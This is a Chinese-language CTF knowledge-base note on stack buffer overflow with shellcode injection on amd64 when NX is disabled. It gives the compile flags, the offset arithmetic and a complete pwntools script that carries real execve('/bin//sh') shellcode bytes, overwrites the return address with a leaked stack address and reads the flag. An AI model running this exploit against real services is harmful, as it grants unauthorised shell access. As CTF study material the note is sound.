---
title: 栈 Shellcode 注入（NX 关闭）
category: pwn
tags: [stack-overflow, shellcode, nx-disabled, amd64, execve]
triggers: [栈溢出, shellcode, NX关闭, execve, /bin/sh, 栈地址泄露, gcc -z execstack, 无PIE, amd64 shellcode]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/pwn/PWN-MessageBoard_栈shellcode.md]
---

## Summary

No NX → 栈可执行 → 栈溢出 + 地址泄露 → 跳转栈上 shellcode 执行 `execve("/bin/sh")`。

## 关键要点

- NX 关闭 = 栈可执行，是 CTF 入门 PWN 题最常见条件
- 编译参数：`gcc -z execstack -fno-stack-protector -no-pie`
- shellcode 中 "/bin/sh" 需用 "//bin/sh" 或 "/bin/sh\0" 保证 8 字节对齐和 NULL 终止

## 核心脚本

```python
from pwn import *
context.arch = 'amd64'

OFFSET = 0x80 + 8  # buf(128) + saved_rbp(8) = 136

# x86-64 execve("/bin//sh", NULL, NULL) shellcode (23 bytes)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

io = remote('host', port)
data = io.recvuntil(b'Message: ')
buf_addr = int(data.split(b'Buffer at: ')[1].split(b'\n')[0], 16)

payload = shellcode + b'A' * (OFFSET - len(shellcode)) + p64(buf_addr)
io.send(payload)
io.sendline(b'cat flag*')
```

## 备忘

- 栈地址直接泄露（`printf("Buffer at: %p\n", buf)`），无需额外 leak
- OFFSET = 128 (buf) + 8 (saved rbp) = 136 字节后覆盖返回地址

## Connections

- **Related:** [[ret2win]] — ret2win 基础
- **Related:** [[ret2text-stack-alignment]] — ret2text 栈对齐
- **Related:** [[heap-uaf-fastbin-overlap]] — 堆相关利用
- **Source:** [ctf-kb/pwn/PWN-MessageBoard_栈shellcode.md](file:///c:/Users/ZZH/.trae/ctf-kb/pwn/PWN-MessageBoard_栈shellcode.md)
